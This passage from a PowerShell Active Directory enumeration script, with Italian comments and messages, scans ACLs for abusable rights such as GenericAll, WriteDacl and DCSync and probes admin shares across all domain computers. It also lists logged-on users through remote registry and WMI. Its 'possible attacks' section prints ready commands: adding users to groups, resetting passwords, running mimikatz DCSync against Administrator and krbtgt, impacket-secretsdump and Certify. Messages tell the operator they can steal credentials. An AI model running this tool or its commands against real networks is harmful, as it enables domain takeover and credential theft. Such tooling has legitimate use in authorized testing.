        "$domainSID-498",     # Enterprise Read-Only Domain Controllers
        "$domainSID-521"      # Read-Only Domain Controllers
    )
    
    $allIgnored = $ignoredSIDs + $privilegedGroupSIDs
    
    # Funzione helper per convertire SID in nome
    function Convert-SIDToName {
        param([string]$SID)
        try {
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
            $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
            return $objUser.Value
        }
        catch {
            return $SID
        }
    }
    
    # Funzione helper per analizzare ACL
    function Get-DangerousACL {
        param(
            [string]$ObjectDN,
            [string]$ObjectName,
            [string]$ObjectType
        )
        
        $localFindings = @()
        
        try {
            $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$ObjectDN")
            $acl = $entry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
            
            foreach ($ace in $acl) {
                $rights = $ace.ActiveDirectoryRights.ToString()
                $sid = $ace.IdentityReference.Value
                
                # Salta SID di sistema e gruppi privilegiati
                if ($sid -in $allIgnored) { continue }
                if ($sid -match '^S-1-5-21-.*-(512|519|518|500|516|498|521)$') { continue }
                
                # Controlla se ha permessi pericolosi
                foreach ($dangerous in $dangerousRights) {
                    if ($rights -match $dangerous) {
                        $principalName = Convert-SIDToName -SID $sid
                        
                        # Ignora se il principal è un gruppo privilegiato
                        if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator|Domain Controllers|CREATOR OWNER') { continue }
                        
                        $localFindings += [PSCustomObject]@{
                            TargetObject = $ObjectName
                            TargetType = $ObjectType
                            Principal = $principalName
                            Rights = $rights
                            Dangerous = $dangerous
                        }
                        break
                    }
                }
            }
        }
        catch {}
        
        return $localFindings
    }
    
    # Enumera utenti
    Write-SubSection "Analisi ACL su Utenti..."
    $users = LDAPSearch -LDAPQuery "(samAccountType=805306368)"
    $userCount = 0
    
    foreach ($user in $users) {
        $userDN = $user.Properties.distinguishedname[0]
        $userName = $user.Properties.samaccountname[0]
        
        $findings += Get-DangerousACL -ObjectDN $userDN -ObjectName $userName -ObjectType "User"
        $userCount++
    }
    Write-Host "        Analizzati $userCount utenti" -ForegroundColor DarkGray
    
    # Enumera gruppi
    Write-SubSection "Analisi ACL su Gruppi..."
    $groups = LDAPSearch -LDAPQuery "(objectCategory=group)"
    $groupCount = 0
    
    foreach ($group in $groups) {
        $groupDN = $group.Properties.distinguishedname[0]
        $groupName = $group.Properties.cn[0]
        
        $findings += Get-DangerousACL -ObjectDN $groupDN -ObjectName $groupName -ObjectType "Group"
        $groupCount++
    }
    Write-Host "        Analizzati $groupCount gruppi" -ForegroundColor DarkGray
    
    # Enumera computer
    Write-SubSection "Analisi ACL su Computer..."
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    $compCount = 0
    
    foreach ($computer in $computers) {
        $compDN = $computer.Properties.distinguishedname[0]
        $compName = $computer.Properties.name[0]
        
        $findings += Get-DangerousACL -ObjectDN $compDN -ObjectName $compName -ObjectType "Computer"
        $compCount++
    }
    Write-Host "        Analizzati $compCount computer" -ForegroundColor DarkGray
    
    # Enumera GPO
    Write-SubSection "Analisi ACL su Group Policy Objects..."
    $gpos = LDAPSearch -LDAPQuery "(objectCategory=groupPolicyContainer)"
    $gpoCount = 0
    
    foreach ($gpo in $gpos) {
        $gpoDN = $gpo.Properties.distinguishedname[0]
        $gpoName = $gpo.Properties.displayname[0]
        if (-not $gpoName) { $gpoName = $gpo.Properties.cn[0] }
        
        $findings += Get-DangerousACL -ObjectDN $gpoDN -ObjectName $gpoName -ObjectType "GPO"
        $gpoCount++
    }
    Write-Host "        Analizzate $gpoCount GPO" -ForegroundColor DarkGray
    
    # Enumera Organizational Units
    Write-SubSection "Analisi ACL su Organizational Units..."
    $ous = LDAPSearch -LDAPQuery "(objectCategory=organizationalUnit)"
    $ouCount = 0
    
    foreach ($ou in $ous) {
        $ouDN = $ou.Properties.distinguishedname[0]
        $ouName = $ou.Properties.name[0]
        if (-not $ouName) { $ouName = $ou.Properties.ou[0] }
        
        $findings += Get-DangerousACL -ObjectDN $ouDN -ObjectName $ouName -ObjectType "OU"
        $ouCount++
    }
    Write-Host "        Analizzate $ouCount OU" -ForegroundColor DarkGray
    
    # Analisi Domain Object
    Write-SubSection "Analisi ACL su Domain Object..."
    $findings += Get-DangerousACL -ObjectDN $DN -ObjectName "DOMAIN ROOT" -ObjectType "Domain"
    Write-Host "        Analizzato Domain Object" -ForegroundColor DarkGray
    
    # Controlla DCSync rights sul dominio
    Write-SubSection "Analisi DCSync Rights..."
    try {
        $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
        $acl = $domainEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
        
        # GUIDs per DCSync
        $replicationGUIDs = @(
            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes
            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes-All
            '89e95b76-444d-4c62-991a-0facbeda640c'   # DS-Replication-Get-Changes-In-Filtered-Set
        )
        
        foreach ($ace in $acl) {
            $sid = $ace.IdentityReference.Value
            
            if ($sid -in $allIgnored) { continue }
            if ($sid -match '^S-1-5-21-.*-(512|519|518|500|516|498|521)$') { continue }
            
            $objectType = $ace.ObjectType.ToString()
            
            if ($objectType -in $replicationGUIDs) {
                $principalName = Convert-SIDToName -SID $sid
                
                if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator|Domain Controllers') { continue }
                
                $findings += [PSCustomObject]@{
                    TargetObject = "DOMAIN"
                    TargetType = "DCSync"
                    Principal = $principalName
                    Rights = "Replication Rights"
                    Dangerous = "DCSync"
                }
            }
        }
    }
    catch {}
    Write-Host "        Analizzati DCSync Rights" -ForegroundColor DarkGray
    
    # Analisi AdminSDHolder
    Write-SubSection "Analisi ACL su AdminSDHolder..."
    $adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DN"
    try {
        $findings += Get-DangerousACL -ObjectDN $adminSDHolderDN -ObjectName "AdminSDHolder" -ObjectType "AdminSDHolder"
        Write-Host "        Analizzato AdminSDHolder" -ForegroundColor DarkGray
    }
    catch {
        Write-Host "        AdminSDHolder non accessibile" -ForegroundColor DarkGray
    }
    
    # Analisi Certificate Templates (AD CS)
    Write-SubSection "Analisi ACL su Certificate Templates..."
    try {
        $configDN = "CN=Configuration,$DN"
        $certTemplatesDN = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN"
        
        # Query per certificate templates
        $configEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$configDN")
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($configEntry)
        $searcher.Filter = "(objectClass=pKICertificateTemplate)"
        $searcher.PageSize = 1000
        $certTemplates = $searcher.FindAll()
        
        $certCount = 0
        foreach ($template in $certTemplates) {
            $templateDN = $template.Properties.distinguishedname[0]
            $templateName = $template.Properties.cn[0]
            
            $findings += Get-DangerousACL -ObjectDN $templateDN -ObjectName $templateName -ObjectType "CertTemplate"
            $certCount++
        }
        
        if ($certCount -gt 0) {
            Write-Host "        Analizzati $certCount Certificate Templates" -ForegroundColor DarkGray
        } else {
            Write-Host "        Nessun Certificate Template trovato" -ForegroundColor DarkGray
        }
    }
    catch {
        Write-Host "        AD CS non installato o non accessibile" -ForegroundColor DarkGray
    }
    
    # Mostra risultati
    if ($findings.Count -gt 0) {
        Write-Section "PERMESSI PERICOLOSI TROVATI! ($($findings.Count) findings)"
        
        # Raggruppa per principal
        $groupedFindings = $findings | Group-Object -Property Principal
        
        foreach ($group in $groupedFindings) {
            Write-Warning "$($group.Name) ha permessi pericolosi:"
            
            foreach ($finding in $group.Group) {
                # Colore basato sul tipo di oggetto
                $typeColor = switch ($finding.TargetType) {
                    'User' { 'White' }
                    'Group' { 'Cyan' }
                    'Computer' { 'Gray' }
                    'GPO' { 'Magenta' }
                    'OU' { 'Blue' }
                    'Domain' { 'Red' }
                    'DCSync' { 'Red' }
                    'AdminSDHolder' { 'Red' }
                    'CertTemplate' { 'Yellow' }
                    default { 'White' }
                }
                
                $dangerColor = if ($finding.Dangerous -match 'GenericAll|DCSync|WriteDacl') { 'Red' } else { 'Yellow' }
                
                Write-Host "        [$($finding.TargetType)] " -ForegroundColor $typeColor -NoNewline
                Write-Host "$($finding.TargetObject)" -ForegroundColor White -NoNewline
                Write-Host " -> " -NoNewline
                Write-Host "$($finding.Dangerous)" -ForegroundColor $dangerColor
            }
            Write-Host ""
        }
        
        Write-Section "POSSIBILI ATTACCHI"
        
        # GenericAll
        $genericAllFindings = $findings | Where-Object { $_.Dangerous -eq 'GenericAll' }
        if ($genericAllFindings) {
            $gaGroups = $genericAllFindings | Where-Object { $_.TargetType -eq 'Group' }
            $gaUsers = $genericAllFindings | Where-Object { $_.TargetType -eq 'User' }
            $gaComputers = $genericAllFindings | Where-Object { $_.TargetType -eq 'Computer' }
            $gaGPOs = $genericAllFindings | Where-Object { $_.TargetType -eq 'GPO' }
            
            Write-Info "GenericAll trovato - Puoi:"
            Write-Host "        - Cambiare password dell'oggetto target" -ForegroundColor White
            Write-Host "        - Aggiungere utenti a gruppi" -ForegroundColor White
            Write-Host "        - Modificare qualsiasi attributo" -ForegroundColor White
            Write-Host ""
            
            if ($gaGroups) {
                Write-Host "        # Aggiungi utente a gruppo:" -ForegroundColor Yellow
                foreach ($f in $gaGroups | Select-Object -First 3) {
                    Write-Host "        net group `"$($f.TargetObject)`" <tuouser> /add /domain" -ForegroundColor Gray
                }
                Write-Host ""
            }
            
            if ($gaUsers) {
                Write-Host "        # Cambia password utente:" -ForegroundColor Yellow
                foreach ($f in $gaUsers | Select-Object -First 3) {
                    Write-Host "        net user $($f.TargetObject) NuovaPassword123! /domain" -ForegroundColor Gray
                }
                Write-Host ""
            }
            
            if ($gaComputers) {
                Write-Host "        # RBCD Attack su computer:" -ForegroundColor Yellow
                Write-Host "        # Configura Resource-Based Constrained Delegation" -ForegroundColor Gray
                Write-Host ""
            }
            
            if ($gaGPOs) {
                Write-Host "        # Modifica GPO per eseguire codice:" -ForegroundColor Yellow
                Write-Host "        # Aggiungi Immediate Scheduled Task nella GPO" -ForegroundColor Gray
                Write-Host ""
            }
        }
        
        # DCSync
        $dcSyncFindings = $findings | Where-Object { $_.Dangerous -eq 'DCSync' }
        if ($dcSyncFindings) {
            Write-Warning "DCSync Rights trovato - Puoi estrarre TUTTI gli hash!"
            Write-Host "        mimikatz # lsadump::dcsync /user:Administrator" -ForegroundColor Yellow
            Write-Host "        mimikatz # lsadump::dcsync /user:krbtgt" -ForegroundColor Yellow
            Write-Host "        impacket-secretsdump domain/user@DC" -ForegroundColor Yellow
            Write-Host ""
        }
        
        # Write permissions
        $writeFindings = $findings | Where-Object { $_.Dangerous -match 'Write|Self' }
        if ($writeFindings) {
            Write-Info "Write permissions trovate - Puoi:"
            Write-Host "        - WriteDacl: Modificare i permessi dell'oggetto" -ForegroundColor White
            Write-Host "        - WriteOwner: Diventare proprietario dell'oggetto" -ForegroundColor White
            Write-Host "        - Self: Aggiungerti a gruppi (Self-Membership)" -ForegroundColor White
            Write-Host ""
        }
        
        # AdminSDHolder
        $adminSDFindings = $findings | Where-Object { $_.TargetType -eq 'AdminSDHolder' }
        if ($adminSDFindings) {
            Write-Warning "Permessi su AdminSDHolder - Persistenza!"
            Write-Host "        # Modifica AdminSDHolder per ottenere permessi permanenti" -ForegroundColor Yellow
            Write-Host "        # SDProp propagherà le modifiche ogni 60 minuti" -ForegroundColor Yellow
            Write-Host ""
        }
        
        # Certificate Templates
        $certFindings = $findings | Where-Object { $_.TargetType -eq 'CertTemplate' }
        if ($certFindings) {
            Write-Warning "Permessi su Certificate Templates - ESC attacks!"
            Write-Host "        # Possibili attacchi ESC1-ESC8" -ForegroundColor Yellow
            Write-Host "        Certify.exe find /vulnerable" -ForegroundColor Yellow
            Write-Host ""
        }
        
    } else {
        Write-Info "Nessun permesso pericoloso trovato su utenti non privilegiati"
    }
}

#endregion

#region Funzioni Enumerazione Sessioni e Accessi

function Get-LocalAdminAccess {
    Write-Banner "RICERCA ACCESSO ADMIN LOCALE"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    $currentHost = $env:COMPUTERNAME
    $currentHost = $currentHost.ToLower()
    
    Write-Section "Test accesso Admin su tutti i computer"
    Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
    Write-Info "Host corrente: $currentHost (escluso dal test)"
    Write-Host ""
    
    $adminAccess = @()
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
    
        # Salta l'host corrente (case-insensitive)
        if ($name.ToLower() -eq $currentHost -or $hostname.StartsWith("$currentHost.")) {
            Write-Host "    [*] $name - Host corrente (skipped)" -ForegroundColor DarkGray
            continue
        }
        
        # Test accesso C$ (più affidabile di ADMIN$)
        $cShare = "\\$hostname\C$"
        
        try {
            $testPath = Join-Path $cShare "Windows"
            $exists = Test-Path $testPath -ErrorAction Stop
            if ($exists) {
                $adminAccess += $hostname
                Write-Warning "$name ($hostname) - ADMIN ACCESS CONFERMATO!"
            }
            else {
                Write-Host "    [*] $name - Accesso negato" -ForegroundColor DarkGray
            }
        }
        catch [System.UnauthorizedAccessException] {
            Write-Host "    [*] $name - Accesso negato" -ForegroundColor DarkGray
        }
        catch {
            Write-Host "    [*] $name - Non raggiungibile" -ForegroundColor DarkGray
        }
    }
    
    if ($adminAccess.Count -gt 0) {
        Write-Section "RIEPILOGO - Computer con Admin Access"
        foreach ($h in $adminAccess) {
            Write-Warning $h
        }
        Write-Host ""
        Write-Info "Puoi connetterti a questi computer ed estrarre credenziali!"
    } else {
        Write-Info "Nessun accesso admin locale trovato con l'utente corrente"
    }
    
    return 
}

function Get-LoggedOnUsersRemoteRegistry {
    param(
        [string]$ComputerName
    )
    
    $loggedOnUsers = @()
    
    try {
        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        $subkeys = $reg.GetSubKeyNames()
        
        foreach ($sid in $subkeys) {
            # Filtra solo SID di utenti di dominio (S-1-5-21-...)
            if ($sid -match '^S-1-5-21-' -and $sid -notmatch '_Classes$') {
                try {
                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
                    $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
                    $loggedOnUsers += $objUser.Value
                }
                catch {
                    # Se non riesce a tradurre, salva il SID raw
                    $loggedOnUsers += "SID: $sid"
                }
            }
        }
        $reg.Close()
    }
    catch {
        return $null
    }
    
    return $loggedOnUsers
}

function Get-DomainLoggedOnUsers {
    Write-Banner "UTENTI LOGGATI NEL DOMINIO"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Enumerazione sessioni via Remote Registry"
    Write-Info "Nota: Richiede Remote Registry attivo sul target (default su Server)"
    Write-Host ""
    
    $sessionsFound = @{}
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        $users = Get-LoggedOnUsersRemoteRegistry -ComputerName $hostname
        
        if ($null -eq $users) {
            Write-Host "    [*] $name - Remote Registry non disponibile" -ForegroundColor DarkGray
        }
        elseif ($users.Count -eq 0) {
            Write-Host "    [*] $name - Nessun utente loggato" -ForegroundColor DarkGray
        }
        else {
            Write-SubSection $name
            foreach ($user in $users) {
                Write-Finding "Utente loggato" $user -Important
                
                if (-not $sessionsFound.ContainsKey($user)) {
                    $sessionsFound[$user] = @()
                }
                $sessionsFound[$user] += $name
            }
        }
    }
    
    if ($sessionsFound.Count -gt 0) {
        Write-Section "RIEPILOGO SESSIONI PER UTENTE"
        foreach ($user in $sessionsFound.Keys) {
            Write-SubSection $user
            foreach ($comp in $sessionsFound[$user]) {
                Write-Finding "Loggato su" $comp
            }
        }
        
        Write-Host ""
        Write-Info "Se hai admin access su questi computer, puoi rubare le credenziali!"
    }
}

function Get-DomainSessionsWMI {
    Write-Banner "SESSIONI VIA WMI"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Enumerazione sessioni via WMI (Win32_ComputerSystem)"
    Write-Info "Nota: Richiede privilegi admin sul target"
    Write-Host ""
    
    $sessionsFound = @{}
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        try {
            $cs = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $hostname -ErrorAction Stop
            $loggedUser = $cs.UserName
            
            if ($loggedUser) {
                Write-SubSection $name
                Write-Finding "Utente loggato" $loggedUser -Important
                
                if (-not $sessionsFound.ContainsKey($loggedUser)) {
                    $sessionsFound[$loggedUser] = @()
                }
                $sessionsFound[$loggedUser] += $name
            }
            else {
                Write-Host "    [*] $name - Nessuna sessione interattiva" -ForegroundColor DarkGray
            }
        }
        catch [System.UnauthorizedAccessException] {
            Write-Host "    [*] $name - Accesso WMI negato" -ForegroundColor DarkGray
        }
        catch {
            Write-Host "    [*] $name - Non raggiungibile" -ForegroundColor DarkGray
        }
    }
    
    if ($sessionsFound.Count -gt 0) {
        Write-Section "RIEPILOGO SESSIONI WMI"
        foreach ($user in $sessionsFound.Keys) {
            Write-SubSection $user
            foreach ($comp in $sessionsFound[$user]) {
                Write-Finding "Loggato su" $comp
            }
        }
    }
}

#endregion

#region Main Function

function Invoke-ADEnum {
    param(
        [switch]$Quick,
        [switch]$Full,
        [switch]$Sessions
    )
    
    $startTime = Get-Date
    
    Write-Host "[*] Avvio enumerazione: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Green
    Write-Host "[*] Utente corrente: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Green
    Write-Host ""
    
    # Enumerazione base
    Get-DomainInfo
    Get-PasswordPolicy
    Get-DomainUsers
    Get-DomainGroups
    Get-SPNs
    Get-DomainComputers
    
    if ($Full -or $Sessions) {
        Get-GPOs
        Get-DomainShares
        Get-ACLAbuse
        Get-LocalAdminAccess
        Get-DomainLoggedOnUsers
        Get-DomainSessionsWMI
    }
    
    # Riepilogo finale
    $endTime = Get-Date
    $duration = $endTime - $startTime
    
    Write-Host ""
    Write-Host "[*] Completato in: $($duration.TotalSeconds.ToString('0.00')) secondi" -ForegroundColor Green
}

#endregion

# Se eseguito direttamente, lancia l'enumerazione
if ($MyInvocation.InvocationName -ne '.') {
    Invoke-ADEnum -Full
}
